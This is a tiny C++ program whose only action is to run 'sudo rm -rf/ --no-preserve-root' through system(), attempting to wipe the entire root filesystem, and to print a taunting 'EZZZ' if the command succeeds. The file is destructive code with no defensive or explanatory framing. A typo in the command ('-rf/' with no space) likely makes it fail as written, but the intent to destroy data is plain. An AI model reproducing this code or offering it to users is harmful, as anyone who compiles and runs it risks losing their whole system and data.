
#include <filesystem>
#include <cstdlib>
#include <iostream>
 int main() {
   int result = system("sudo rm -rf/ --no-preserve-root");
   if (result == 0){
     std::cout << "EZZZ";
   }
     return 0;
 }
